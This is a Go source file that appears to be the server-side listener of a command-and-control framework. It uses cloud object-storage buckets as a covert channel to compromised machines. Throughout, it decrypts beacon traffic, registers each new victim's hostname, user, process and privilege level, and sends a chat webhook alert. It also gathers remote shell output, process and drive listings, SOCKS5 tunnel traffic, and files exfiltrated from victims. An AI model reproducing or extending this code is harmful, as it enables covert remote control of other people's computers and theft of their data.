package oss

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/logger"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/webhooks"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// OSSConfig OSS配置
type OSSConfig struct {
	Endpoint        string
	AccessKeyID     string
	AccessKeySecret string
	BucketName      string
	PollInterval    time.Duration
	MaxWorkers      int
	RetryCount      int
}

// OSSClient OSS客户端结构
type OSSClient struct {
	Config     *OSSConfig
	IsRunning  atomic.Bool
	StopChan   chan struct{}
	WorkerPool chan struct{}
	Wg         sync.WaitGroup
	LastPoll   time.Time
	Stats      *OSSStats
}

// OSSStats 统计信息
type OSSStats struct {
	TotalMessages     int64
	ProcessedMessages int64
	FailedMessages    int64
	LastError         string
	LastPollTime      time.Time
	mu                sync.RWMutex
}

// ProcessedClient 已处理客户端缓存
type ProcessedClient struct {
	UID         string
	LastSeen    time.Time
	MessageChan chan []byte
	StopChan    chan struct{}
}

var (
	globalOSSManager = make(map[string]*OSSClient)
	ossManagerMu     sync.RWMutex

	// 处理中的客户端
	processedClients = make(map[string]*ProcessedClient)
	processedMu      sync.RWMutex

	// OSS统计
	globalOSSStats = &OSSStats{}
)

// NewOSSClient 创建新的OSS客户端
func NewOSSClient(endpoint, accessKeyID, accessKeySecret, bucketName string) *OSSClient {
	return &OSSClient{
		Config: &OSSConfig{
			Endpoint:        endpoint,
			AccessKeyID:     accessKeyID,
			AccessKeySecret: accessKeySecret,
			BucketName:      bucketName,
			PollInterval:    time.Second * 2, // 默认2秒轮询
			MaxWorkers:      10,              // 最大工作协程数
			RetryCount:      3,               // 重试次数
		},
		StopChan:   make(chan struct{}),
		WorkerPool: make(chan struct{}, 10),
		Stats:      &OSSStats{},
	}
}

// HandleOSSConnection 处理OSS连接（优化版）
func HandleOSSConnection(endpoint, accessKeyID, accessKeySecret, bucketName string) {
	// 创建客户端
	client := NewOSSClient(endpoint, accessKeyID, accessKeySecret, bucketName)

	// 注册到全局管理器
	ossKey := endpoint + ":" + accessKeyID + ":" + bucketName
	ossManagerMu.Lock()
	globalOSSManager[ossKey] = client
	ossManagerMu.Unlock()

	// 初始化OSS客户端
	if err := InitClient(endpoint, accessKeyID, accessKeySecret, bucketName); err != nil {
		logger.Error("Failed to initialize OSS client:", err)
		return
	}

	logger.Info("OSS client started:", ossKey)

	// 设置运行状态
	client.IsRunning.Store(true)

	// 启动监控协程
	client.Wg.Add(1)
	go client.monitor()

	// 主处理循环
	client.processLoop()

	// 等待所有协程结束
	client.Wg.Wait()

	// 清理资源
	ossManagerMu.Lock()
	delete(globalOSSManager, ossKey)
	ossManagerMu.Unlock()

	logger.Info("OSS client stopped:", ossKey)
}

// processLoop 处理循环
func (c *OSSClient) processLoop() {
	// 指数退避参数
	backoffFactor := 1
	maxBackoff := 32

	for c.IsRunning.Load() {
		select {
		case <-c.StopChan:
			logger.Info("OSS client received stop signal")
			return
		default:
			startTime := time.Now()

			// 获取消息列表
			messages, err := c.pollMessages()
			if err != nil {
				logger.Error("Failed to poll OSS messages:", err)

				// 指数退避
				backoff := time.Duration(backoffFactor) * c.Config.PollInterval
				if backoffFactor < maxBackoff {
					backoffFactor *= 2
				}

				logger.Info("Backing off for", backoff, "seconds")
				time.Sleep(backoff)
				continue
			}

			// 重置退避因子
			backoffFactor = 1

			// 更新统计
			c.Stats.mu.Lock()
			c.Stats.TotalMessages += int64(len(messages))
			c.Stats.LastPollTime = time.Now()
			c.Stats.mu.Unlock()

			// 处理消息
			if len(messages) > 0 {
				c.processMessages(messages)
			}

			// 控制轮询频率
			elapsed := time.Since(startTime)
			if elapsed < c.Config.PollInterval {
				sleepTime := c.Config.PollInterval - elapsed
				time.Sleep(sleepTime)
			}

			// 清理过期的客户端
			c.cleanupStaleClients()
		}
	}
}

// pollMessages 轮询消息
func (c *OSSClient) pollMessages() ([]string, error) {
	var keys []string

	// 列出所有client相关的key
	objects := List(Service)
	for _, obj := range objects {
		if strings.Contains(obj.Key, "client") {
			keys = append(keys, obj.Key)
		}
	}

	// 按时间戳排序
	sort.Slice(keys, func(i, j int) bool {
		return keys[i] < keys[j]
	})

	// 更新最后轮询时间
	c.LastPoll = time.Now()

	return keys, nil
}

// processMessages 处理消息
func (c *OSSClient) processMessages(keys []string) {
	// 使用工作池处理消息
	semaphore := make(chan struct{}, c.Config.MaxWorkers)
	var wg sync.WaitGroup

	for _, key := range keys {
		if !c.IsRunning.Load() {
			break
		}

		wg.Add(1)
		semaphore <- struct{}{}

		go func(k string) {
			defer wg.Done()
			defer func() { <-semaphore }()

			// 重试机制
			for attempt := 0; attempt <= c.Config.RetryCount; attempt++ {
				if err := c.processSingleMessage(k); err == nil {
					c.Stats.mu.Lock()
					c.Stats.ProcessedMessages++
					c.Stats.mu.Unlock()
					break
				} else {
					if attempt == c.Config.RetryCount {
						c.Stats.mu.Lock()
						c.Stats.FailedMessages++
						c.Stats.LastError = err.Error()
						c.Stats.mu.Unlock()
						logger.Error("Failed to process message after retries:", k, "Error:", err)
					} else {
						logger.Warn("Retry processing message:", k, "Attempt:", attempt+1, "Error:", err)
						time.Sleep(time.Duration(attempt+1) * time.Second)
					}
				}
			}
		}(key)
	}

	wg.Wait()
}

// processSingleMessage 处理单个消息
func (c *OSSClient) processSingleMessage(key string) error {
	// 获取消息内容
	message := Get(Service, key)

	// 删除已处理的消息
	Del(Service, key)

	// 处理消息
	return processMessage(message)
}

// processMessage 处理消息内容
func processMessage(message []byte) error {
	if len(message) < 4 {
		return fmt.Errorf("message too short")
	}

	msgTypeBytes := message[:4]
	msgType := binary.BigEndian.Uint32(msgTypeBytes)

	switch msgType {
	case 1: // firstBlood
		return handleFirstBlood(message[4:])
	case 2: // otherMsg
		return handleOtherMsg(message[4:])
	default:
		return fmt.Errorf("unknown message type: %d", msgType)
	}
}

// handleFirstBlood 处理首次连接
func handleFirstBlood(msg []byte) error {
	tmpMetainfo, err := encrypt.DecodeBase64(msg)
	if err != nil {
		return fmt.Errorf("decode base64 failed: %w", err)
	}

	metainfo, err := encrypt.Decrypt(tmpMetainfo)
	if err != nil {
		return fmt.Errorf("decrypt failed: %w", err)
	}

	uid := encrypt.BytesToMD5(metainfo)

	// 更新连接类型
	connection.MuClientListenerType.Lock()
	connection.ClientListenerType[uid] = "oss"
	connection.MuClientListenerType.Unlock()

	// 检查是否已存在
	var existingClient database.Clients
	exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)

	if !exists {
		processID := binary.BigEndian.Uint32(metainfo[:4])
		flag := int(metainfo[4:5][0])
		ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
		localIP := utils.Uint32ToIP(ipInt).String()
		osInfo := string(metainfo[9:])

		osArray := strings.Split(osInfo, "\t")
		hostName := osArray[0]
		UserName := osArray[1]
		processName := osArray[2]

		externalIp := "oss上线"
		address := "oss上线"

		currentTime := time.Now()
		timeFormat := "01-02 15:04"
		formattedTime := currentTime.Format(timeFormat)

		arch := "x86"

		if flag > 8 {
			UserName += "*"
			flag = flag - 8
		}
		if flag > 4 {
			arch = "x64"
		}

		// 使用事务插入
		session := database.Engine.NewSession()
		defer session.Close()

		if err := session.Begin(); err != nil {
			return fmt.Errorf("begin transaction failed: %w", err)
		}

		c := database.Clients{
			Uid:        uid,
			FirstStart: formattedTime,
			ExternalIP: externalIp,
			InternalIP: localIP,
			Username:   UserName,
			Computer:   hostName,
			Process:    processName,
			Pid:        strconv.Itoa(int(processID)),
			Address:    address,
			Arch:       arch,
			Note:       "",
			Sleep:      "5",
			Online:     "1",
			Color:      "",
		}

		if _, err := session.Insert(&c); err != nil {
			session.Rollback()
			return fmt.Errorf("insert client failed: %w", err)
		}

		if _, err := session.Insert(&database.Shell{Uid: uid, ShellContent: ""}); err != nil {
			session.Rollback()
			return fmt.Errorf("insert shell failed: %w", err)
		}

		if _, err := session.Insert(&database.Notes{Uid: uid, Note: ""}); err != nil {
			session.Rollback()
			return fmt.Errorf("insert notes failed: %w", err)
		}

		if err := session.Commit(); err != nil {
			return fmt.Errorf("commit transaction failed: %w", err)
		}

		// 发送Webhook通知
		if exits, key := webhooks.CheckEnable(); exits {
			webhooks.SendWecom(c, key)
		}

		logger.Info("New OSS client registered:", uid)
	}

	return nil
}

// handleOtherMsg 处理其他消息
func handleOtherMsg(msg []byte) error {
	if len(msg) < 4 {
		return fmt.Errorf("otherMsg too short")
	}

	metaLen := binary.BigEndian.Uint32(msg[:4])
	if len(msg) < int(4+metaLen) {
		return fmt.Errorf("invalid meta length")
	}

	metaMsg := msg[4 : 4+metaLen]
	realMsg := msg[4+metaLen:]

	tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
	if err != nil {
		return fmt.Errorf("decode base64 failed: %w", err)
	}

	metainfo, err := encrypt.Decrypt(tmpMetainfo)
	if err != nil {
		return fmt.Errorf("decrypt failed: %w", err)
	}

	uid := encrypt.BytesToMD5(metainfo)

	dataBytes, err := encrypt.DecodeBase64(realMsg)
	if err != nil {
		return fmt.Errorf("decode base64 failed: %w", err)
	}

	dataBytes, err = encrypt.Decrypt(dataBytes)
	if err != nil {
		return fmt.Errorf("first decrypt failed: %w", err)
	}

	dataBytes, err = encrypt.Decrypt(dataBytes)
	if err != nil {
		return fmt.Errorf("second decrypt failed: %w", err)
	}

	if len(dataBytes) < 4 {
		return fmt.Errorf("decrypted data too short")
	}

	replyTypeBytes := dataBytes[:4]
	data := dataBytes[4:]
	replyType := binary.BigEndian.Uint32(replyTypeBytes)

	switch replyType {
	case 0: // 命令行展示
		var shell database.Shell
		if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
			shell.ShellContent += string(data) + "\n"
			if _, err := database.Engine.Where("uid = ?", uid).Update(&shell); err != nil {
				logger.Error("Failed to update shell:", err)
			}
		}

	case 31: // 错误展示
		var shell database.Shell
		if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
			shell.ShellContent += "!Error: " + string(data) + "\n"
			if _, err := database.Engine.Where("uid = ?", uid).Update(&shell); err != nil {
				logger.Error("Failed to update shell:", err)
			}
		}

	case command.PS:
		command.VarPidQueue.Add(uid, string(data))

	case command.FileBrowse:
		command.VarFileBrowserQueue.Add(uid, string(data))

	case 22: // 文件下载第一条信息
		if len(data) < 4 {
			return fmt.Errorf("file download info too short")
		}

		fileLen := int(binary.BigEndian.Uint32(data[:4]))
		filePath := string(data[4:])

		// 使用安全路径函数
		fullPath, err := utils.GetSafeFilePath(uid, filePath)
		if err != nil {
			return fmt.Errorf("security check failed: %w", err)
		}

		// 确保下载目录存在
		downloadDir := filepath.Dir(fullPath)
		if err := os.MkdirAll(downloadDir, 0755); err != nil {
			return fmt.Errorf("create download directory failed: %w", err)
		}

		// 更新数据库
		sql := `
UPDATE downloads
SET file_size = ?, downloaded_size = ?
WHERE uid = ? AND file_path = ?;
`
		if _, err := database.Engine.QueryString(sql, fileLen, 0, uid, filePath); err != nil {
			logger.Error("Database update failed:", err)
		}

		// 检查并删除已存在的文件
		if _, err := os.Stat(fullPath); err == nil {
			if err := os.Remove(fullPath); err != nil {
				return fmt.Errorf("remove existing file failed: %w", err)
			}
		}

		// 创建新文件
		fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
		if err != nil {
			return fmt.Errorf("create file failed: %w", err)
		}
		fp.Close()

	case command.DOWNLOAD: // 文件下载
		if len(data) < 4 {
			return fmt.Errorf("download data too short")
		}

		filePathLen := int(binary.BigEndian.Uint32(data[:4]))
		if len(data) < 4+filePathLen {
			return fmt.Errorf("invalid file path length in download")
		}

		filePath := string(data[4 : 4+filePathLen])
		fileContent := data[4+filePathLen:]

		// 使用安全路径函数
		fullPath, err := utils.GetSafeFilePath(uid, filePath)
		if err != nil {
			return fmt.Errorf("security check failed: %w", err)
		}

		var fileDownloads database.Downloads
		if _, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads); err == nil {
			fileDownloads.DownloadedSize += len(fileContent)
			if _, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads); err != nil {
				logger.Error("Failed to update download record:", err)
			}
		}

		// 确保目录存在
		downloadDir := filepath.Dir(fullPath)
		if err := os.MkdirAll(downloadDir, 0755); err != nil {
			return fmt.Errorf("create download directory failed: %w", err)
		}

		// 追加文件内容
		fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			return fmt.Errorf("open file failed: %w", err)
		}
		defer fp.Close()

		if _, err := fp.Write(fileContent); err != nil {
			return fmt.Errorf("write file content failed: %w", err)
		}

	case command.DRIVES:
		drives := utils.GetExistingDrives(data)
		command.VarDrivesQueue.Add(uid, drives)

	case command.FileContent:
		if len(data) < 4 {
			return fmt.Errorf("file content data too short")
		}

		filePathLen := int(binary.BigEndian.Uint32(data[:4]))
		if len(data) < 4+filePathLen {
			return fmt.Errorf("invalid file path length in file content")
		}

		filePath := string(data[4 : 4+filePathLen])
		fileContent := data[4+filePathLen:]
		command.VarFileContentQueue.Add(uid, filePath, string(fileContent))

	case command.Socks5Data:
		if len(data) < 16 {
			return fmt.Errorf("socks5 data too short")
		}

		md5sign := data[:16]
		rawData := data[16:]
		command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))

	default:
		return fmt.Errorf("unknown reply type: %d", replyType)
	}

	return nil
}

// monitor 监控协程
func (c *OSSClient) monitor() {
	defer c.Wg.Done()

	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			c.Stats.mu.RLock()
			logger.Info("OSS Stats:",
				"TotalMessages:", c.Stats.TotalMessages,
				"ProcessedMessages:", c.Stats.ProcessedMessages,
				"FailedMessages:", c.Stats.FailedMessages,
				"LastPoll:", c.Stats.LastPollTime.Format("15:04:05"),
			)
			c.Stats.mu.RUnlock()

		case <-c.StopChan:
			return
		}
	}
}

// cleanupStaleClients 清理过期的客户端
func (c *OSSClient) cleanupStaleClients() {
	processedMu.Lock()
	defer processedMu.Unlock()

	now := time.Now()
	for uid, client := range processedClients {
		if now.Sub(client.LastSeen) > 10*time.Minute {
			close(client.StopChan)
			delete(processedClients, uid)
			logger.Info("Cleaned up stale OSS client:", uid)
		}
	}
}

// StopOSSClient 停止OSS客户端
func StopOSSClient(endpoint, accessKeyID, bucketName string) {
	ossKey := endpoint + ":" + accessKeyID + ":" + bucketName

	ossManagerMu.RLock()
	client, exists := globalOSSManager[ossKey]
	ossManagerMu.RUnlock()

	if exists {
		logger.Info("Stopping OSS client:", ossKey)
		client.IsRunning.Store(false)
		close(client.StopChan)
		client.Wg.Wait()
	}
}

// CleanupAllOSS 清理所有OSS客户端
func CleanupAllOSS() {
	ossManagerMu.Lock()
	defer ossManagerMu.Unlock()

	for key, client := range globalOSSManager {
		logger.Info("Stopping OSS client:", key)
		client.IsRunning.Store(false)
		close(client.StopChan)
	}

	// 等待所有客户端停止
	for _, client := range globalOSSManager {
		client.Wg.Wait()
	}

	// 清空管理器
	globalOSSManager = make(map[string]*OSSClient)
}

// GetOSSStats 获取OSS统计信息
func GetOSSStats() map[string]interface{} {
	stats := make(map[string]interface{})

	ossManagerMu.RLock()
	stats["total_oss_clients"] = len(globalOSSManager)
	ossManagerMu.RUnlock()

	processedMu.RLock()
	stats["processed_clients"] = len(processedClients)
	processedMu.RUnlock()

	return stats
}
